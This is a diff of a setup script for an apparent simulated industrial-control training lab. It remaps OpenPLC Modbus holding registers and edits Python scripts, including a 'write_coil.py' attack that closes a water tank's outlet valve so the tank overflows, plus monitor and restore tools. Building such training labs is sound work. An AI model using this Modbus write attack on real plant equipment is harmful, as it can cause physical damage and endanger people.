@@ -169,12 +169,12 @@ mkdir -p /root/Desktop/Attack_Scripts
 # persistent connection state that can desynchronise between calls.
 #
 # Modbus TCP address map for Tutorial 01 (pump_control.st):
-#   FC01/FC05  Coil 0   pump_run    %QX0.0  — inlet pump   (TRUE = running)
-#   FC01/FC05  Coil 1   valve_open  %QX0.1  — outlet valve (TRUE = open)
-#   FC01/FC05  Coil 2   emrg_stop   %QX0.2  — emergency stop
-#   FC03/FC06  HR 1024  tank_level  %MW0    — tank level in cm (0–1000)
-#   FC03       HR 1025  inlet_flow  %MW1    — inlet flow L/min
-#   FC03       HR 1026  outlet_flow %MW2    — outlet flow L/min
+#   FC01/FC05  Coil 0  pump_run    %QX0.0  — inlet pump   (TRUE = running)
+#   FC01/FC05  Coil 1  valve_open  %QX0.1  — outlet valve (TRUE = open)
+#   FC01/FC05  Coil 2  emrg_stop   %QX0.2  — emergency stop
+#   FC03/FC06  HR 0    tank_level  %QW0    — tank level in cm (0–1000)
+#   FC03       HR 1    inlet_flow  %QW1    — inlet flow L/min
+#   FC03       HR 2    outlet_flow %QW2    — outlet flow L/min
 #
 # Attack goal: write Coil 1 (valve_open) → FALSE to CLOSE the outlet drain.
 # With the inlet pump still running, inflow > 0 and outflow = 0 → tank fills.
@@ -197,10 +197,10 @@ Coil map (Tutorial 01 — pump_control program):
     Coil 1  valve_open   FALSE=outlet valve CLOSED, TRUE=outlet valve OPEN
     Coil 2  emrg_stop    FALSE=normal,             TRUE=emergency stop tripped
 
-Holding register map (OpenPLC %MW memory words start at Modbus HR address 1024):
-    HR 1024  tank_level   Tank fill level in cm  (500=5.00 m, 1000=10.00 m = overflow)
-    HR 1025  inlet_flow   Inlet flow rate in L/min  (>0 when inlet pump is running)
-    HR 1026  outlet_flow  Outlet flow rate in L/min (>0 when outlet valve is open)
+Holding register map (OpenPLC %QW output words start at Modbus HR address 0):
+    HR 0  tank_level   Tank fill level in cm  (500=5.00 m, 1000=10.00 m = overflow)
+    HR 1  inlet_flow   Inlet flow rate in L/min  (>0 when inlet pump is running)
+    HR 2  outlet_flow  Outlet flow rate in L/min (>0 when outlet valve is open)
 """
 
 import os, sys, socket, struct
@@ -269,9 +269,9 @@ for idx, state in enumerate(coils):
 
 print()
 
-# ── FC03: Read Holding Registers 1024–1026 (%MW0–%MW2) ───────────────────────
+# ── FC03: Read Holding Registers 0–2 (%QW0–%QW2) ─────────────────────────────
 print("=== HOLDING REGISTERS  (Modbus FC03 — Read Holding Registers) ===")
-regs = read_holding_registers(PLC_IP, PLC_PORT, start=1024, count=3)
+regs = read_holding_registers(PLC_IP, PLC_PORT, start=0, count=3)
 if regs is None:
     print("[error] FC03 Read Holding Registers failed")
     sys.exit(1)
@@ -279,7 +279,7 @@ if regs is None:
 for idx, raw in enumerate(regs):
     label   = REG_LABELS.get(idx, f'reg_{idx}')
     display = f"{raw} cm  ({raw / 100.0:.2f} m)" if idx == 0 else str(raw)
-    print(f"  HR{1024+idx}  {label:<35} {display}")
+    print(f"  HR{idx}  {label:<35} {display}")
 
 print()
 print("[+] Done — no writes performed")
@@ -288,7 +288,7 @@ PYEOF
 # ── write_coil.py ─────────────────────────────────────────────────────────────
 # Default (no args): ATTACK — closes the outlet valve (Coil 1 → FALSE).
 #   With the inlet pump still running (Coil 0 = TRUE), inflow > outflow and
-#   the tank level rises.  Watch HR 1024 climb and the Water Tank canvas
+#   the tank level rises.  Watch HR 0 climb and the Water Tank canvas
 #   animation fill up.
 #
 # --restore: re-opens the outlet valve (Coil 1 → TRUE).
@@ -304,7 +304,7 @@ write_coil.py — Modbus coil write attack against the Tutorial 01 water treatme
 Default action  (no flags):  ATTACK  — close the outlet valve (Coil 1 → FALSE).
                               The inlet pump keeps running, so water flows in with
                               no path out.  The PLC physics loop accumulates the
-                              level — watch HR 1024 (tank_level) rise in the OT
+                              level — watch HR 0 (tank_level) rise in the OT
                               canvas animation and in the terminal progress bar.
 
 With --restore:              RESTORE — re-open the outlet valve (Coil 1 → TRUE).
@@ -405,12 +405,12 @@ if not RESTORE_MODE:
     print("    Water is accumulating — overflow at 1000 cm (approx. 5 min).")
     print("    To restore:  python3 write_coil.py --restore")
     print()
-    print("[*] Monitoring HR 1024 (tank_level) — watch it rise.")
+    print("[*] Monitoring HR 0 (tank_level) — watch it rise.")
     print("[*] The Water Tank icon on the OT canvas also animates the fill level.")
     print("[*] Press Ctrl+C to stop monitoring (attack stays active).\n")
     try:
         while True:
-            lvl = read_register(PLC_IP, PLC_PORT, address=1024)
+            lvl = read_register(PLC_IP, PLC_PORT, address=0)
             if lvl is not None:
                 lvl = min(lvl, 1000)
                 print(f"\r{_bar(lvl)}", end='', flush=True)
@@ -427,7 +427,7 @@ else:
     # ── RESTORE mode ─────────────────────────────────────────────────────────
     print("[+] Outlet valve restored to OPEN.")
     print("    Coil 1 = TRUE (outlet valve OPEN)  |  Coil 0 unchanged (inlet pump ON)")
-    lvl = read_register(PLC_IP, PLC_PORT, address=1024)
+    lvl = read_register(PLC_IP, PLC_PORT, address=0)
     if lvl is not None:
         print(f"\n[*] Current tank_level: {lvl} cm")
         print(f"[*] {_bar(lvl)}")
@@ -447,10 +447,10 @@ chmod +x /root/Desktop/Attack_Scripts/write_coil.py
 # Baseline state:
 #   Coil 0 (pump_run)   → TRUE  — inlet pump ON
 #   Coil 1 (valve_open) → TRUE  — outlet valve OPEN
-#   HR 1024 (tank_level) → 500  — tank at 50% (5.00 m)
+#   HR 0 (tank_level)    → 500  — tank at 50% (5.00 m)
 #
 # With both coils TRUE, inlet_flow = outlet_flow = 120 L/min → balanced →
-# tank_level stays stable at 500 cm. Writing HR 1024 = 500 directly resets
+# tank_level stays stable at 500 cm. Writing HR 0 = 500 directly resets
 # the displayed level without restarting the simulation.
 cat > /root/Desktop/Attack_Scripts/plc_init.py << 'PYEOF'
 #!/usr/bin/env python3
@@ -463,7 +463,7 @@ after an attack without restarting the full simulation.
 Writes:
   Coil 0 (pump_run)    → TRUE   inlet pump ON   (%QX0.0)
   Coil 1 (valve_open)  → TRUE   outlet valve OPEN (%QX0.1)
-  HR 1024 (tank_level) → 500    tank at 50% baseline (%MW0)
+  HR 0 (tank_level)    → 500    tank at 50% baseline (%QW0)
 
 With pump_run=TRUE and valve_open=TRUE the flow is balanced (inlet=outlet=120
 L/min) so tank_level stays at 500 cm until the attack writes valve_open=FALSE.
@@ -515,12 +515,12 @@ else:
     print(f"[plc-init] write_coil(1) failed")
     success = False
 
-# ── HR 1024: tank_level → 500 (50% baseline) ──────────────────────────────────
-# OpenPLC %MW0 → Modbus HR 1024 (MIN_16B_RANGE = 1024 in modbus.cpp).
-if write_register(PLC_IP, PLC_PORT, address=1024, value=500):
-    print("[plc-init] HR 1024 (tank_level) → 500   (50% baseline, 5.00 m)")
+# ── HR 0: tank_level → 500 (50% baseline) ────────────────────────────────────
+# OpenPLC %QW0 → Modbus HR 0.
+if write_register(PLC_IP, PLC_PORT, address=0, value=500):
+    print("[plc-init] HR 0 (tank_level)    → 500   (50% baseline, 5.00 m)")
 else:
-    print(f"[plc-init] write_register(1024) failed")
+    print(f"[plc-init] write_register(0) failed")
     success = False
 
 if success:
@@ -534,14 +534,14 @@ PYEOF
 chmod +x /root/Desktop/Attack_Scripts/plc_init.py
 
 # ── monitor_level.py ──────────────────────────────────────────────────────────
-# Live ASCII bar graph of HR 1024 (tank_level). Run in a second terminal
+# Live ASCII bar graph of HR 0 (tank_level). Run in a second terminal
 # alongside write_coil.py to watch the level rise numerically.
 cat > /root/Desktop/Attack_Scripts/monitor_level.py << 'PYEOF'
 #!/usr/bin/env python3
 """
 monitor_level.py — Live tank-level monitor using raw Modbus TCP.
 
-Polls HR 1024 (%MW0 = tank_level), HR 1025 (inlet_flow), and HR 1026
+Polls HR 0 (%QW0 = tank_level), HR 1 (inlet_flow), and HR 2
 (outlet_flow) every second and prints a continuously-updating ASCII bar.
 
 Usage:
@@ -577,14 +577,14 @@ def read_registers(ip, port, start, count, unit=1):
         return None
     return list(struct.unpack_from(f'>{count}H', resp, 9))
 
-print(f"[*] Connecting to {PLC_IP}:{PLC_PORT} — polling HR 1024–1026 every {INTERVAL:.1f} s")
+print(f"[*] Connecting to {PLC_IP}:{PLC_PORT} — polling HR 0–2 every {INTERVAL:.1f} s")
 print(f"[*] Press Ctrl+C to stop.\n")
 print(f"  {'LEVEL BAR':^42}  LEVEL    PCT    IN     OUT    STATUS")
 print(f"  {'─'*42}  {'─'*6}  {'─'*5}  {'─'*6}  {'─'*6}  {'─'*8}")
 
 try:
     while True:
-        regs = read_registers(PLC_IP, PLC_PORT, start=1024, count=3)
+        regs = read_registers(PLC_IP, PLC_PORT, start=0, count=3)
         if regs:
             lvl    = min(regs[0], 1000)
             q_in   = regs[1]
